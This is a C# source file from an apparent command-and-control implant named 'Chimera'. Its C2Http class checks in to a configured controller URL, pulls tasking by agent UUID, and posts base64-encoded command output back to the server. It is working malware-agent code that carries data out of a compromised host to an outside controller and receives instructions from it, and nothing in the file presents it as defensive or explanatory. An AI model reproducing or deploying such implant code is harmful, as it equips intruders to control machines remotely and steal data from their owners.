using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace Chimera
{
    public static class C2Http
    {
        private static readonly HttpClient client = new HttpClient();

        public static string CheckIn()
        {
            return PostJson(Config.C2Url + "/checkin", "");
        }

        public static string GetTasking(string uuid)
        {
            return PostJson(Config.C2Url + "/tasking/" + uuid, uuid);
        }

        public static bool PostResponse(string uuid, string taskid, string output)
        {
            // Format: UUID + plaintext JSON
            var json = $"{{\"taskid\":\"{taskid}\",\"output\":\"{EscapeJson(output)}\",\"status\":\"complete\"}}";
            var payload = uuid + json;
            var content = new StringContent(Convert.ToBase64String(Encoding.UTF8.GetBytes(payload)), Encoding.UTF8, "application/octet-stream");
            try
            {
                var resp = client.PostAsync(Config.C2Url + "/response/" + uuid, content).Result;
                return resp.IsSuccessStatusCode;
            }
            catch { return false; }
        }

        private static string PostJson(string url, string uuid)
        {
            try
            {
                var payload = uuid + "{}";
                var content = new StringContent(Convert.ToBase64String(Encoding.UTF8.GetBytes(payload)), Encoding.UTF8, "application/octet-stream");
                var resp = client.PostAsync(url, content).Result;
                if (resp.IsSuccessStatusCode)
                {
                    string b64 = resp.Content.ReadAsStringAsync().Result;
                    byte[] data = Convert.FromBase64String(b64);
                    // Strip leading 36 bytes (UUID)
                    if (data.Length > 36)
                        return Encoding.UTF8.GetString(data, 36, data.Length - 36);
                }
            }
            catch { }
            return null;
        }

        private static string EscapeJson(string s)
        {
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "\\r");
        }
    }
}
